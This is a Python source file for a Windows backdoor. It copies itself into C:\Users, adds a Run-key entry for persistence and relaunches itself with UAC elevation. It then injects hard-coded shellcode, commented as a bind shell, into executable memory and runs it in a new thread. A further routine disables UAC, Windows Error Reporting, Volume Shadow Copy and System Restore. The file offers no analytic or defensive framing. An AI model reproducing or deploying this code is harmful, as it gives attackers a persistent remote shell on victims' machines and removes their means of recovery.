import os
import sys
import ctypes
import os.path
import pythoncom
import pywintypes
import win32api
import subprocess
from _winreg import *
import getpass
import win32com.shell.shell as shell


def autorun(dir, fileName, run):

	os.system('copy %s %s'%(fileName, dir))

# Queries Windows registry for the autorun key value
	key = OpenKey(HKEY_LOCAL_MACHINE, run)
	runkey =[]
	try:
		i = 0
		while True:
			subkey = EnumValue(key, i)
			runkey.append(subkey[0])
			i += 1
	except WindowsError:
		pass

	# Queries Windows registry for the autorun key value
	# Stores the key values in runkey array
	key = OpenKey(HKEY_LOCAL_MACHINE, run)
	runkey =[]
	try:
		i = 0
		while True:
			subkey = EnumValue(key, i)
			runkey.append(subkey[0])
			i += 1
	except WindowsError:
		pass

# Set key
	if 'foobar' not in runkey:
		try:
			key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
			SetValueEx(key ,'foobar',0,REG_SZ,r"C:\Users\shellware.exe")
			key.Close()
		except WindowsError:
			pass


def execute():
    #Bind shell
	shellcode = bytearray(
	"\xb8\xee\x7c\x98\x76\xdb\xc6\xd9\x74\x24\xf4\x5b\x31\xc9"
	"\xb1\x53\x31\x43\x12\x03\x43\x12\x83\x2d\x78\x7a\x83\x4d"
	"\x69\xf8\x6c\xad\x6a\x9d\xe5\x48\x5b\x9d\x92\x19\xcc\x2d"
	"\xd0\x4f\xe1\xc6\xb4\x7b\x72\xaa\x10\x8c\x33\x01\x47\xa3"
	"\xc4\x3a\xbb\xa2\x46\x41\xe8\x04\x76\x8a\xfd\x45\xbf\xf7"
	"\x0c\x17\x68\x73\xa2\x87\x1d\xc9\x7f\x2c\x6d\xdf\x07\xd1"
	"\x26\xde\x26\x44\x3c\xb9\xe8\x67\x91\xb1\xa0\x7f\xf6\xfc"
	"\x7b\xf4\xcc\x8b\x7d\xdc\x1c\x73\xd1\x21\x91\x86\x2b\x66"
	"\x16\x79\x5e\x9e\x64\x04\x59\x65\x16\xd2\xec\x7d\xb0\x91"
	"\x57\x59\x40\x75\x01\x2a\x4e\x32\x45\x74\x53\xc5\x8a\x0f"
	"\x6f\x4e\x2d\xdf\xf9\x14\x0a\xfb\xa2\xcf\x33\x5a\x0f\xa1"
	"\x4c\xbc\xf0\x1e\xe9\xb7\x1d\x4a\x80\x9a\x49\xbf\xa9\x24"
	"\x8a\xd7\xba\x57\xb8\x78\x11\xff\xf0\xf1\xbf\xf8\xf7\x2b"
	"\x07\x96\x09\xd4\x78\xbf\xcd\x80\x28\xd7\xe4\xa8\xa2\x27"
	"\x08\x7d\x5e\x2f\xaf\x2e\x7d\xd2\x0f\x9f\xc1\x7c\xf8\xf5"
	"\xcd\xa3\x18\xf6\x07\xcc\xb1\x0b\xa8\xd0\x82\x85\x4e\x7e"
	"\x15\xc0\xd9\x16\xd7\x37\xd2\x81\x28\x12\x4a\x25\x60\x74"
	"\x4d\x4a\x71\x52\xf9\xdc\xfa\xb1\x3d\xfd\xfc\x9f\x15\x6a"
	"\x6a\x55\xf4\xd9\x0a\x6a\xdd\x89\xaf\xf9\xba\x49\xb9\xe1"
	"\x14\x1e\xee\xd4\x6c\xca\x02\x4e\xc7\xe8\xde\x16\x20\xa8"
	"\x04\xeb\xaf\x31\xc8\x57\x94\x21\x14\x57\x90\x15\xc8\x0e"
	"\x4e\xc3\xae\xf8\x20\xbd\x78\x56\xeb\x29\xfc\x94\x2c\x2f"
	"\x01\xf1\xda\xcf\xb0\xac\x9a\xf0\x7d\x39\x2b\x89\x63\xd9"
	"\xd4\x40\x20\xe9\x9e\xc8\x01\x62\x47\x99\x13\xef\x78\x74"
	"\x57\x16\xfb\x7c\x28\xed\xe3\xf5\x2d\xa9\xa3\xe6\x5f\xa2"
	"\x41\x08\xf3\xc3\x43")
 
	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
	ctypes.c_int(len(shellcode)),
	ctypes.c_int(0x3000),
	ctypes.c_int(0x40))
	
	buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
	
	ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
	buf,
	ctypes.c_int(len(shellcode)))
	
	ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.c_int(ptr),
	ctypes.c_int(0),
	ctypes.c_int(0),
	ctypes.pointer(ctypes.c_int(0)))
	
	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
	
def main():
	
	dir = "C:\\Users\\"
	fileName = sys.argv[0]
	run = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	autorun(dir, fileName, run)
	execute()


	
if os.path.isfile("C:\Users\shellware.exe"):
	pass
else:
	if not shell.IsUserAnAdmin():
		#Prompt UAC 
		ASADMIN = "asadmin"

		if sys.argv[-1] != ASADMIN:
			script = os.path.abspath(sys.argv[0])
			params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
			shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
			sys.exit(0)

class regedit():
	
	def disable():
		try: 
			aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
			aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\Windows Error Reporting", 0, KEY_WRITE)
			subkeys = [ "Disabled", "DontSendAdditionalData",  "LoggingDisabled" ]
			for subkey in subkeys:
				SetValueEx(aKey,subkey,0, REG_SZ, r"1")
		except:
			pass

		try: 
			aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
			aKey = OpenKey(aReg, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
			SetValueEx(aKey,"EnableLUA",0, REG_SZ, r"0") 
		except:
			pass
		
		try:
			aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
			aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\Windows Error Reporting", 0, KEY_WRITE)
			SetValueEx(aKey,"Disabled",0, REG_SZ, r"1")
		except:
			pass

		try:
			aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
			aKey = OpenKey(aReg, r"System\\CurrentControlSet\\Services\\vss", 0, KEY_WRITE)
			SetValueEx(aKey,"Start",0, REG_SZ, r"4") 
		except:
			pass

		try:
			aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
			aKey = OpenKey(aReg, r"System\\CurrentControlSet\\Services\\srservice", 0, KEY_WRITE)
			SetValueEx(aKey,"Start",0, REG_SZ, r"4") 
		except:
			pass

		try:
			aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
			aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", 0, KEY_WRITE)
			SetValueEx(aKey,"DisableSR",0, REG_SZ, r"1")
		except:
			pass


		
if __name__ == "__main__":
        main()